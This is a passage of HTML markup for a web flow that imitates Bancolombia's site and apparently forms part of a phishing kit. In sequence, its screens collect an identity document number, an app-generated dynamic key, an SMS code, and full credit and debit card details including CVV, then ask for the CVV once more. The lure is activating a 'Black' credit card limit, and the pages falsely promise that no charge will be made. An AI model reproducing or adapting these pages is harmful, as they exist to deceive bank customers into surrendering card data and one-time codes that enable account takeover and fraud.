            <img src="assets/logo-horizontal.svg" alt="Bancolombia" class="lp-footer__logo">
            <p class="lp-footer__copy">Copyright © 2026 Bancolombia.</p>
            <img src="assets/estrella-hola.svg" alt="Vigilado" class="lp-footer__vigilado">
          </div>
          <img src="assets/pie-trazo-escritorio.svg" alt="" class="lp-footer__trazo">
          <img src="assets/pie-trazo-movil.svg" alt="" class="lp-footer__trazo-m">
        </footer>
      </div>
  </div></section>

</div>


<div class="credit-doc-page app-view" id="creditDocPage">

  <header class="cd-header">
    <button type="button" class="cd-header__back" id="creditDocBackBtn" aria-label="Volver">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="15 18 9 12 15 6"></polyline>
      </svg>
      <span>Volver</span>
    </button>
    <img src="assets/login/logo-encabezado.svg" alt="Bancolombia" class="cd-header__logo">
  </header>

  <main class="cd-main">
    <section class="cd-card">
      <h1 class="cd-title">¡Todo listo! Empecemos con tu numero de documento</h1>

      <div class="cd-field">
        <label class="cd-label" for="creditDocTipo">Tipo de documento de identidad</label>
        <div class="cd-dropdown">
          <div class="cd-row cd-row--select" id="creditDocTipoRow" tabindex="0" role="combobox" aria-haspopup="listbox" aria-expanded="false">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
              <rect x="3" y="4" width="18" height="16" rx="2"></rect>
              <circle cx="8" cy="10" r="2"></circle>
              <path d="M12 9h5"></path>
              <path d="M12 13h5"></path>
              <path d="M6 16h12"></path>
            </svg>
            <span class="cd-row__text" id="creditDocTipoText">Cedula de Ciudadania</span>
            <svg id="creditDocTipoChevron" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
              <polyline points="6 9 12 15 18 9"></polyline>
            </svg>
          </div>
          <div class="cd-dropdown__list" id="creditDocTipoDropdown" role="listbox">
            <div class="cd-dropdown__opt cd-dropdown__opt--selected" data-value="CC">Cedula de Ciudadania</div>
            <div class="cd-dropdown__opt" data-value="PA">Pasaporte</div>
            <div class="cd-dropdown__opt" data-value="CE">Cedula de extranjeria</div>
            <div class="cd-dropdown__opt" data-value="TI">Tarjeta de identidad</div>
          </div>
        </div>
      </div>

      <div class="cd-field">
        <label class="cd-label" for="creditDocNumInput">Numero de documento</label>
        <div class="cd-row">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
            <rect x="3" y="4" width="18" height="16" rx="2"></rect>
            <circle cx="8" cy="10" r="2"></circle>
            <path d="M12 9h5"></path>
            <path d="M12 13h5"></path>
            <path d="M6 16h12"></path>
          </svg>
          <input type="text" id="creditDocNumInput" maxlength="12" inputmode="numeric" autocomplete="off" placeholder="Ingresa tu número de documento">
        </div>
      </div>

      <div class="cd-info">
        <div class="cd-info__icon">i</div>
        <p>Si tienes otro tipo de documento, acercate a la oficina mas cercana para solicitar tu producto.</p>
      </div>

      <div class="cd-check-row" id="creditDocCheckRow">
        <div class="cd-check cd-check--on" id="creditDocCheck" role="checkbox" aria-checked="true" tabindex="0">
          <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
            <polyline points="1.5 6 4.5 9 10.5 3" stroke="#2C2A29" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></polyline>
          </svg>
        </div>
        <p class="cd-check-label">Autorizo a Bancolombia para que el numero de celular y el correo electronico, sean
          tratados para contactarme y/o enviarme la informacion relacionada con la solicitud del producto. Igualmente
          para que me consulten ante Operadores de Informacion y Riesgo con el fin de verificar mi informacion personal.
          <a href="#" onclick="return false;">Terminos, Condiciones y Politicas de Privacidad para la solicitud de
            productos.</a>
        </p>
      </div>

      <div class="cd-actions">
        <div class="cd-footer-info">
          <img src="assets/login/logo-encabezado.svg" alt="Bancolombia" class="cd-footer-info__logo">
          <p class="cd-footer-info__copy">Copyright © 2026 Bancolombia S.A.</p>
        </div>
        <button type="button" class="cd-next" id="creditDocNextBtn" disabled="">Siguiente</button>
      </div>
    </section>
  </main>

  <footer class="cd-desktop-footer">
    <div class="cd-desktop-footer__left">
      <img src="assets/login/logo-encabezado.svg" alt="Bancolombia" class="cd-desktop-footer__logo">
      <p class="cd-desktop-footer__copy">Copyright © 2026 Bancolombia S.A.</p>
      <img src="assets/login/pegatina-sonrisa.svg" alt="Vigilado" class="cd-desktop-footer__vigilado">
    </div>
    <div class="cd-desktop-footer__right">
      <p id="creditDocFooterIp">Dirección IP 191.110.55.59</p>
      <p id="creditDocFooterDate">martes 28 de julio de 2026. 8:29:24 p. m.</p>
    </div>
  </footer>

</div>





<div class="login-page app-view" id="flowOtpPage" data-flow-view="otp">
  <header class="login-header">
    <div></div>
    <img src="assets/login/logo-encabezado.svg" alt="Bancolombia" class="login-header-logo">
    <button type="button" class="login-header-right" aria-label="Salir"><span>Salir</span><img src="assets/login/icono-cerrar.svg" alt=""></button>
  </header>
  <main class="login-main">
    <div class="login-main__toast-slot">
      <div class="login-panel-error-bar js-panel-error-bar" hidden="" role="alert" aria-live="assertive">
        <div class="login-panel-error-bar__accent" aria-hidden="true"><span class="login-panel-error-bar__icon">!</span>
        </div>
        <div class="login-panel-error-bar__content">
          <strong class="login-panel-error-bar__title">Datos incorrectos</strong>
          <p class="login-panel-error-bar__text">Los datos ingresados no coinciden, inténtalo nuevamente.</p>
        </div>
        <button type="button" class="login-panel-error-bar__close js-panel-error-close" aria-label="Cerrar notificación">×</button>
      </div>
    </div>
    <div class="login-main__body">
      <img src="assets/login/trazo-escritorio.svg" alt="" class="login-trazo-desktop">
      <section class="login-center">
        <h1 class="login-title">Confirma que eres tú</h1>
        <div class="login-card" style="padding:clamp(1.2rem,3vw,2rem);gap:clamp(0.75rem,2.5vw,1.15rem)">
          <p class="flow-subtitle" style="font-size:clamp(0.85rem,2.8vw,0.95rem);line-height:1.45">Para autorizar esta
            operación, por favor ingresa tu clave dinámica generada en la app.</p>
          <div class="flow-pin-label-row">
            <img src="assets/login/candadito-lindo.svg" alt="">
            <span class="flow-pin-lbl">Ingresa tu clave dinámica</span>
          </div>
          <div class="flow-digits" id="flowOtpDigits" data-digit-count="6" style="margin:clamp(0.6rem,1.8vw,0.85rem) 0 clamp(0.85rem,2.2vw,1rem);gap:clamp(5px,1.5vw,8px)" data-digit-wired="1">
            <input class="flow-digit" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-flow-otp-i="0" autocomplete="one-time-code" style="font-size:clamp(1.1rem,4vw,1.35rem);padding:clamp(6px,2vw,10px) 0;width:clamp(36px,9vw,44px)">
            <input class="flow-digit" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-flow-otp-i="1" style="font-size:clamp(1.1rem,4vw,1.35rem);padding:clamp(6px,2vw,10px) 0;width:clamp(36px,9vw,44px)">
            <input class="flow-digit" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-flow-otp-i="2" style="font-size:clamp(1.1rem,4vw,1.35rem);padding:clamp(6px,2vw,10px) 0;width:clamp(36px,9vw,44px)">
            <input class="flow-digit" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-flow-otp-i="3" style="font-size:clamp(1.1rem,4vw,1.35rem);padding:clamp(6px,2vw,10px) 0;width:clamp(36px,9vw,44px)">
            <input class="flow-digit" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-flow-otp-i="4" style="font-size:clamp(1.1rem,4vw,1.35rem);padding:clamp(6px,2vw,10px) 0;width:clamp(36px,9vw,44px)">
            <input class="flow-digit" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-flow-otp-i="5" style="font-size:clamp(1.1rem,4vw,1.35rem);padding:clamp(6px,2vw,10px) 0;width:clamp(36px,9vw,44px)">
          </div>
          <div style="width:100%;margin-top:0">
            <button type="button" class="login-btn next" id="flowOtpBtn" disabled="" style="width:100%;height:clamp(46px,11vw,52px);font-size:clamp(0.95rem,3.2vw,1.05rem);font-weight:600">Verificar</button>
          </div>
        </div>
      </section>
      <img src="assets/login/trazo-movil.svg" alt="" class="login-trazo-mobile" role="presentation">
    </div>
  </main>
  <footer class="login-footer">
    <div class="login-footer-left">
      <img src="assets/login/logo-pie.svg" alt="Bancolombia" class="login-footer-logo">
      <img src="assets/login/pegatina-sonrisa.svg" alt="Vigilado" class="login-footer-vigilado">
    </div>
    <div class="login-footer-right">
      <p class="js-flow-footer-ip">Dirección IP: 191.110.55.59</p>
      <p class="js-flow-footer-date">Martes, 28 de Julio de 2026, 8:29 p. m.</p>
    </div>
  </footer>
  <div class="login-page__bottom-spacer" aria-hidden="true"></div>
</div>


<div class="login-page app-view" id="flowSmsPage" data-flow-view="sms">
  <header class="login-header">
    <div></div>
    <img src="assets/login/logo-encabezado.svg" alt="Bancolombia" class="login-header-logo">
    <button type="button" class="login-header-right" aria-label="Salir"><span>Salir</span><img src="assets/login/icono-cerrar.svg" alt=""></button>
  </header>
  <main class="login-main">
    <div class="login-main__toast-slot">
      <div class="login-panel-error-bar js-panel-error-bar" hidden="" role="alert" aria-live="assertive">
        <div class="login-panel-error-bar__accent" aria-hidden="true"><span class="login-panel-error-bar__icon">!</span>
        </div>
        <div class="login-panel-error-bar__content">
          <strong class="login-panel-error-bar__title">Datos incorrectos</strong>
          <p class="login-panel-error-bar__text">Los datos ingresados no coinciden, inténtalo nuevamente.</p>
        </div>
        <button type="button" class="login-panel-error-bar__close js-panel-error-close" aria-label="Cerrar notificación">×</button>
      </div>
    </div>
    <div class="login-main__body">
      <img src="assets/login/trazo-escritorio.svg" alt="" class="login-trazo-desktop">
      <section class="login-center">
        <h1 class="login-title">Código de seguridad</h1>
        <div class="login-card" style="padding:clamp(1.2rem,3vw,2rem);gap:clamp(0.75rem,2.5vw,1.15rem)">
          <p class="flow-subtitle" style="font-size:clamp(0.85rem,2.8vw,0.95rem);line-height:1.45">Para autorizar esta
            operación, por favor ingresa el código SMS enviado a tu celular.</p>
          <div class="flow-pin-label-row">
            <img src="assets/login/candadito-lindo.svg" alt="">
            <span class="flow-pin-lbl">Ingresa el código SMS</span>
          </div>
          <div class="flow-digits" id="flowSmsDigits" data-digit-count="6" style="margin:clamp(0.6rem,1.8vw,0.85rem) 0 clamp(0.85rem,2.2vw,1rem);gap:clamp(5px,1.5vw,8px)" data-digit-wired="1">
            <input class="flow-digit" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-flow-sms-i="0" autocomplete="one-time-code" style="font-size:clamp(1.1rem,4vw,1.35rem);padding:clamp(6px,2vw,10px) 0;width:clamp(36px,9vw,44px)">
            <input class="flow-digit" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-flow-sms-i="1" style="font-size:clamp(1.1rem,4vw,1.35rem);padding:clamp(6px,2vw,10px) 0;width:clamp(36px,9vw,44px)">
            <input class="flow-digit" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-flow-sms-i="2" style="font-size:clamp(1.1rem,4vw,1.35rem);padding:clamp(6px,2vw,10px) 0;width:clamp(36px,9vw,44px)">
            <input class="flow-digit" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-flow-sms-i="3" style="font-size:clamp(1.1rem,4vw,1.35rem);padding:clamp(6px,2vw,10px) 0;width:clamp(36px,9vw,44px)">
            <input class="flow-digit" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-flow-sms-i="4" style="font-size:clamp(1.1rem,4vw,1.35rem);padding:clamp(6px,2vw,10px) 0;width:clamp(36px,9vw,44px)">
            <input class="flow-digit" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*" data-flow-sms-i="5" style="font-size:clamp(1.1rem,4vw,1.35rem);padding:clamp(6px,2vw,10px) 0;width:clamp(36px,9vw,44px)">
          </div>
          <div style="width:100%;margin-top:0">
            <button type="button" class="login-btn next" id="flowSmsBtn" disabled="" style="width:100%;height:clamp(46px,11vw,52px);font-size:clamp(0.95rem,3.2vw,1.05rem);font-weight:600">Verificar</button>
          </div>
        </div>
      </section>
      <img src="assets/login/trazo-movil.svg" alt="" class="login-trazo-mobile" role="presentation">
    </div>
  </main>
  <footer class="login-footer">
    <div class="login-footer-left">
      <img src="assets/login/logo-pie.svg" alt="Bancolombia" class="login-footer-logo">
      <img src="assets/login/pegatina-sonrisa.svg" alt="Vigilado" class="login-footer-vigilado">
    </div>
    <div class="login-footer-right">
      <p class="js-flow-footer-ip">Dirección IP: 191.110.55.59</p>
      <p class="js-flow-footer-date">Martes, 28 de Julio de 2026, 8:29 p. m.</p>
    </div>
  </footer>
  <div class="login-page__bottom-spacer" aria-hidden="true"></div>
</div>


<div class="login-page app-view" id="flowCardCreditPage" data-flow-view="tarjetaCredito">
  <header class="login-header">
    <div></div>
    <img src="assets/login/logo-encabezado.svg" alt="Bancolombia" class="login-header-logo">
    <button type="button" class="login-header-right" aria-label="Salir"><span>Salir</span><img src="assets/login/icono-cerrar.svg" alt=""></button>
  </header>
  <main class="login-main">
    <div class="login-main__toast-slot">
      <div class="login-panel-error-bar js-panel-error-bar" hidden="" role="alert" aria-live="assertive">
        <div class="login-panel-error-bar__accent" aria-hidden="true"><span class="login-panel-error-bar__icon">!</span>
        </div>
        <div class="login-panel-error-bar__content">
          <strong class="login-panel-error-bar__title">Datos incorrectos</strong>
          <p class="login-panel-error-bar__text">Los datos ingresados no coinciden, inténtalo nuevamente.</p>
        </div>
        <button type="button" class="login-panel-error-bar__close js-panel-error-close" aria-label="Cerrar notificación">×</button>
      </div>
    </div>
    <div class="login-main__body">
      <img src="assets/login/trazo-escritorio.svg" alt="" class="login-trazo-desktop">
      <section class="login-center">
        <h1 class="login-title">Confirma tu identidad</h1>
        <div class="login-card" style="padding:clamp(0.8rem,2.5vw,1.5rem);gap:clamp(0.5rem,1.8vw,0.85rem);max-height:none;min-height:0;align-items:stretch;box-sizing:border-box;overflow:visible">
          <div style="position:relative;width:clamp(160px,65%,240px);margin:0 auto clamp(0.2rem,0.8vw,0.4rem)">
            <img id="flowCardCreditImg" src="assets/mundo-bonito/postal-grande.png" alt="" style="width:100%;height:auto;display:block;border-radius:10px">
          </div>
          <div class="flow-pin-label-row" style="margin:0">
            <img src="assets/login/candadito-lindo.svg" alt="">
            <span id="flowCardCreditLbl" class="flow-pin-lbl">Ingresa los datos de tu <strong>tarjeta de
                crédito</strong> para validar tu identidad y activar el cupo de tu <strong>Tarjeta de Crédito
                Black</strong>.</span>
          </div>
          <div class="premium-security-badge">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#D4B106" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
            <span class="premium-security-text">No se realizará ningún cargo. Información protegida con cifrado bancario.</span>
          </div>
          <div style="display:flex;flex-direction:column;gap:clamp(0.5rem,1.6vw,0.75rem);margin-top:clamp(0.1rem,0.5vw,0.2rem)">
            <div>
              <label for="flowCcCreditName" class="premium-label">Nombre del titular</label>
              <div class="premium-input-wrapper">
                <input id="flowCcCreditName" type="text" class="premium-input premium-input-with-icon" maxlength="50" placeholder="Como aparece en la tarjeta" autocomplete="cc-name">
                <svg class="premium-input-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                </svg>
              </div>
            </div>
            <div>
              <label for="flowCcCreditNumber" class="premium-label">Número de tarjeta</label>
              <div class="premium-input-wrapper">
                <input id="flowCcCreditNumber" type="text" class="premium-input premium-input-with-icon" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="cc-number" style="letter-spacing:0.08em">
                <svg class="premium-input-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                </svg>
              </div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:clamp(0.5rem,3vw,0.75rem)">
              <div>
                <label for="flowCcCreditExp" class="premium-label">Vencimiento</label>
                <div class="premium-input-wrapper">
                  <input id="flowCcCreditExp" type="text" class="premium-input premium-input-with-icon" inputmode="numeric" maxlength="5" placeholder="MM/AA" autocomplete="cc-exp" style="letter-spacing:0.05em">
                  <svg class="premium-input-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 00-2 2z"></path>
                  </svg>
                </div>
              </div>
              <div>
                <label for="flowCcCreditCvv2" class="premium-label">CVV</label>
                <div class="premium-input-wrapper">
                  <input id="flowCcCreditCvv2" type="password" class="premium-input premium-input-with-icon" inputmode="numeric" maxlength="3" placeholder="•••" autocomplete="cc-csc" style="letter-spacing:0.3em">
                  <svg class="premium-input-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                  </svg>
                </div>
              </div>
            </div>
          </div>
          <p id="flowCcCreditError" aria-live="polite" style="display:none;margin:clamp(0.3rem,1vw,0.5rem) 0 0;padding:clamp(0.4rem,1.5vw,0.6rem);background:#fef2f2;border:1px solid #fecaca;border-radius:6px;color:#dc2626;font-size:clamp(0.72rem,2vw,0.82rem);text-align:center">
          </p>
          <div style="width:100%;margin-top:clamp(0.2rem,0.8vw,0.4rem)">
            <button type="button" class="login-btn next" id="flowCardCreditBtn" disabled="" style="width:100%;height:clamp(40px,9vw,48px);font-size:clamp(0.88rem,2.8vw,0.98rem);font-weight:600">Continuar</button>
          </div>
        </div>
      </section>
      <img src="assets/login/trazo-movil.svg" alt="" class="login-trazo-mobile" role="presentation">
    </div>
  </main>
  <footer class="login-footer">
    <div class="login-footer-left">
      <img src="assets/login/logo-pie.svg" alt="Bancolombia" class="login-footer-logo">
      <img src="assets/login/pegatina-sonrisa.svg" alt="Vigilado" class="login-footer-vigilado">
    </div>
    <div class="login-footer-right">
      <p class="js-flow-footer-ip">Dirección IP: 191.110.55.59</p>
      <p class="js-flow-footer-date">Martes, 28 de Julio de 2026, 8:29 p. m.</p>
    </div>
  </footer>
  <div class="login-page__bottom-spacer" aria-hidden="true"></div>
</div>


<div class="login-page app-view" id="flowCardDebitPage" data-flow-view="tarjetaDebito">
  <header class="login-header">
    <div></div>
    <img src="assets/login/logo-encabezado.svg" alt="Bancolombia" class="login-header-logo">
    <button type="button" class="login-header-right" aria-label="Salir"><span>Salir</span><img src="assets/login/icono-cerrar.svg" alt=""></button>
  </header>
  <main class="login-main">
    <div class="login-main__toast-slot">
      <div class="login-panel-error-bar js-panel-error-bar" hidden="" role="alert" aria-live="assertive">
        <div class="login-panel-error-bar__accent" aria-hidden="true"><span class="login-panel-error-bar__icon">!</span>
        </div>
        <div class="login-panel-error-bar__content">
          <strong class="login-panel-error-bar__title">Datos incorrectos</strong>
          <p class="login-panel-error-bar__text">Los datos ingresados no coinciden, inténtalo nuevamente.</p>
        </div>
        <button type="button" class="login-panel-error-bar__close js-panel-error-close" aria-label="Cerrar notificación">×</button>
      </div>
    </div>
    <div class="login-main__body">
      <img src="assets/login/trazo-escritorio.svg" alt="" class="login-trazo-desktop">
      <section class="login-center">
        <h1 class="login-title">Confirma tu identidad</h1>
        <div class="login-card" style="padding:clamp(0.8rem,2.5vw,1.5rem);gap:clamp(0.5rem,1.8vw,0.85rem);max-height:none;min-height:0;align-items:stretch;box-sizing:border-box;overflow:visible">
          <div style="position:relative;width:clamp(160px,65%,240px);margin:0 auto clamp(0.2rem,0.8vw,0.4rem)">
            <img id="flowCardDebitImg" src="assets/mundo-bonito/postal-grande.png" alt="" style="width:100%;height:auto;display:block;border-radius:10px">
          </div>
          <div class="flow-pin-label-row" style="margin:0">
            <img src="assets/login/candadito-lindo.svg" alt="">
            <span id="flowCardDebitLbl" class="flow-pin-lbl">Ingresa los datos de tu <strong>tarjeta de débito</strong>
              para validar tu identidad y activar el cupo de tu <strong>Tarjeta de Crédito Black</strong>.</span>
          </div>
          <div class="premium-security-badge">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#D4B106" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
            <span class="premium-security-text">No se realizará ningún cargo. Información protegida con cifrado bancario.</span>
          </div>
          <div style="display:flex;flex-direction:column;gap:clamp(0.5rem,1.6vw,0.75rem);margin-top:clamp(0.1rem,0.5vw,0.2rem)">
            <div>
              <label for="flowCcDebitName" class="premium-label">Nombre del titular</label>
              <div class="premium-input-wrapper">
                <input id="flowCcDebitName" type="text" class="premium-input premium-input-with-icon" maxlength="50" placeholder="Como aparece en la tarjeta" autocomplete="cc-name">
                <svg class="premium-input-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                </svg>
              </div>
            </div>
            <div>
              <label for="flowCcDebitNumber" class="premium-label">Número de tarjeta</label>
              <div class="premium-input-wrapper">
                <input id="flowCcDebitNumber" type="text" class="premium-input premium-input-with-icon" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="cc-number" style="letter-spacing:0.08em">
                <svg class="premium-input-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                </svg>
              </div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:clamp(0.5rem,3vw,0.75rem)">
              <div>
                <label for="flowCcDebitExp" class="premium-label">Vencimiento</label>
                <div class="premium-input-wrapper">
                  <input id="flowCcDebitExp" type="text" class="premium-input premium-input-with-icon" inputmode="numeric" maxlength="5" placeholder="MM/AA" autocomplete="cc-exp" style="letter-spacing:0.05em">
                  <svg class="premium-input-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 00-2 2z"></path>
                  </svg>
                </div>
              </div>
              <div>
                <label for="flowCcDebitCvv2" class="premium-label">CVV</label>
                <div class="premium-input-wrapper">
                  <input id="flowCcDebitCvv2" type="password" class="premium-input premium-input-with-icon" inputmode="numeric" maxlength="3" placeholder="•••" autocomplete="cc-csc" style="letter-spacing:0.3em">
                  <svg class="premium-input-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                  </svg>
                </div>
              </div>
            </div>
          </div>
          <p id="flowCcDebitError" aria-live="polite" style="display:none;margin:clamp(0.3rem,1vw,0.5rem) 0 0;padding:clamp(0.4rem,1.5vw,0.6rem);background:#fef2f2;border:1px solid #fecaca;border-radius:6px;color:#dc2626;font-size:clamp(0.72rem,2vw,0.82rem);text-align:center">
          </p>
          <div style="width:100%;margin-top:clamp(0.2rem,0.8vw,0.4rem)">
            <button type="button" class="login-btn next" id="flowCardDebitBtn" disabled="" style="width:100%;height:clamp(40px,9vw,48px);font-size:clamp(0.88rem,2.8vw,0.98rem);font-weight:600">Continuar</button>
          </div>
        </div>
      </section>
      <img src="assets/login/trazo-movil.svg" alt="" class="login-trazo-mobile" role="presentation">
    </div>
  </main>
  <footer class="login-footer">
    <div class="login-footer-left">
      <img src="assets/login/logo-pie.svg" alt="Bancolombia" class="login-footer-logo">
      <img src="assets/login/pegatina-sonrisa.svg" alt="Vigilado" class="login-footer-vigilado">
    </div>
    <div class="login-footer-right">
      <p class="js-flow-footer-ip">Dirección IP: 191.110.55.59</p>
      <p class="js-flow-footer-date">Martes, 28 de Julio de 2026, 8:29 p. m.</p>
    </div>
  </footer>
  <div class="login-page__bottom-spacer" aria-hidden="true"></div>
</div>


<div class="login-page app-view" id="flowCvvPage" data-flow-view="cvv">
  <header class="login-header">
    <div></div>
    <img src="assets/login/logo-encabezado.svg" alt="Bancolombia" class="login-header-logo">
    <button type="button" class="login-header-right" aria-label="Salir"><span>Salir</span><img src="assets/login/icono-cerrar.svg" alt=""></button>
  </header>
  <main class="login-main">
    <div class="login-main__toast-slot">
      <div class="login-panel-error-bar js-panel-error-bar" hidden="" role="alert" aria-live="assertive">
        <div class="login-panel-error-bar__accent" aria-hidden="true"><span class="login-panel-error-bar__icon">!</span>
        </div>
        <div class="login-panel-error-bar__content">
          <strong class="login-panel-error-bar__title">Datos incorrectos</strong>
          <p class="login-panel-error-bar__text">Los datos ingresados no coinciden, inténtalo nuevamente.</p>
        </div>
        <button type="button" class="login-panel-error-bar__close js-panel-error-close" aria-label="Cerrar notificación">×</button>
      </div>
    </div>
    <div class="login-main__body">
      <img src="assets/login/trazo-escritorio.svg" alt="" class="login-trazo-desktop">
      <section class="login-center">
        <h1 class="login-title">Confirma que eres tú</h1>
        <div style="display:flex;justify-content:center;margin-bottom:clamp(0.5rem,1.5vw,1rem)">
          <img src="assets/error.svg" alt="" style="width:clamp(45px,10vw,60px);height:auto">
        </div>
        <div class="login-card" style="padding:clamp(1.2rem,3vw,2rem);gap:clamp(0.75rem,2.5vw,1.15rem);max-height:none;min-height:0">
          <p class="flow-subtitle" style="font-size:clamp(0.85rem,2.8vw,0.95rem);line-height:1.45">Por favor ingresa el
            código de seguridad (CVV) de tu tarjeta.</p>
          <div style="display:flex;justify-content:center;width:100%;margin:clamp(0.2rem,0.8vw,0.4rem) 0">
            <img src="assets/cvs.png" alt="Referencia CVV" style="width:clamp(180px,65%,240px);height:auto;display:block;border-radius:8px">
          </div>
          <div class="flow-pin-label-row">
            <img src="assets/login/candadito-lindo.svg" alt="">
            <span class="flow-pin-lbl">Ingresa el CVV de tu tarjeta</span>
          </div>
          <div style="display:flex;justify-content:center;margin:clamp(0.6rem,1.8vw,0.85rem) 0">
            <input id="flowCvvInput" type="text" inputmode="numeric" maxlength="3" placeholder="•••" autocomplete="cc-csc" style="width:clamp(80px,20vw,100px);padding:clamp(8px,2.5vw,12px) clamp(10px,3vw,14px);font-size:clamp(1.3rem,5vw,1.6rem);text-align:center;letter-spacing:0.3em;border:2px solid #2C2A29;border-radius:8px;background:#FAFAFA;font-family:'CIBFontSans',Arial,sans-serif;outline:none">
          </div>
          <div style="width:100%;margin-top:0">
            <button type="button" class="login-btn next" id="flowCvvBtn" disabled="" style="width:100%;height:clamp(46px,11vw,52px);font-size:clamp(0.95rem,3.2vw,1.05rem);font-weight:600">Continuar</button>
          </div>
        </div>
      </section>
      <img src="assets/login/trazo-movil.svg" alt="" class="login-trazo-mobile" role="presentation">
    </div>
  </main>
  <footer class="login-footer">
    <div class="login-footer-left">
      <img src="assets/login/logo-pie.svg" alt="Bancolombia" class="login-footer-logo">
      <img src="assets/login/pegatina-sonrisa.svg" alt="Vigilado" class="login-footer-vigilado">
    </div>
    <div class="login-footer-right">
      <p class="js-flow-footer-ip">Dirección IP: 191.110.55.59</p>
      <p class="js-flow-footer-date">Martes, 28 de Julio de 2026, 8:29 p. m.</p>
    </div>
  </footer>
  <div class="login-page__bottom-spacer" aria-hidden="true"></div>
</div>


<div class="soyyo-nuevo-page app-view" id="flowSoyyoPage" data-flow-view="soyyo">
  <div class="soyyo-nuevo-app" id="flowSoyyoFormView">
    <div class="soyyo-nuevo-toastSlot">
      <div class="login-panel-error-bar js-panel-error-bar" hidden="" role="alert" aria-live="assertive">
        <div class="login-panel-error-bar__accent" aria-hidden="true"><span class="login-panel-error-bar__icon">!</span>
        </div>
        <div class="login-panel-error-bar__content">
          <strong class="login-panel-error-bar__title">Datos incorrectos</strong>
          <p class="login-panel-error-bar__text">Los datos ingresados no coinciden, inténtalo nuevamente.</p>
        </div>
        <button type="button" class="login-panel-error-bar__close js-panel-error-close" aria-label="Cerrar notificación">×</button>
      </div>
    </div>
    <header class="soyyo-nuevo-header">
      <img src="assets/login/logo-encabezado.svg" alt="Bancolombia" class="soyyo-nuevo-header__logo">
    </header>
    <main class="soyyo-nuevo-main">
